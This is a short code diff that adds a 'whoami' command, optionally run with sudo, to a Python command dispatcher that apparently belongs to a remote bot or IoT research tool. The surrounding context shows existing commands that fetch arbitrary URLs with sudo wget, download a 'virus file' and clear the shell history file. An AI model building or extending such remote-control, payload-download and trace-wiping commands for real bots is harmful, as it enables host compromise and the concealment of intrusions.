@@ -75,6 +75,11 @@ class BashCommands:
         url = request[0]
         return RunSubProcess(f"sudo mkdir -p ~/AriotsTemp;sudo wget -O ~/AriotsTemp/{os.path.basename(url)} {url}")
 
+    def WhoAmI(self, request):
+        if request and request[0] == "=r":
+            return RunSubProcess(f"sudo whoami")
+        return RunSubProcess(f"whoami")
+
 
 class BashCommandsHelp:
     def IpConfig(self, request):
@@ -167,6 +172,10 @@ class BashCommandsHelp:
         return PrintAndLog("Receives one parameter [URL] and performs a wget request from that url\n"
                            "Performs the bash command: 'wget ~/AriotsTemp/ [requestUrl]'")
 
+    def WhoAmI(self, request):
+        return PrintAndLog("Runs the self discovering command 'whoami'\n"
+                           "The parameter -r can be passed at the end to indicate to run as root (sudo)")
+
 
 def GetBashCommandsSwitch(helpRequested=False):
     commands = BashCommands() if not helpRequested else BashCommandsHelp()
@@ -191,7 +200,8 @@ def GetBashCommandsSwitch(helpRequested=False):
         'commonbots': commands.CommonBots,
         'clearhistoryfile': commands.ClearHistoryFile,
         'downloadvirusfile': commands.DownloadVirusFile,
-        'downloadfile': commands.DownloadFile
+        'downloadfile': commands.DownloadFile,
+        'whoami': commands.WhoAmI,
     }
 
     return switchOptions
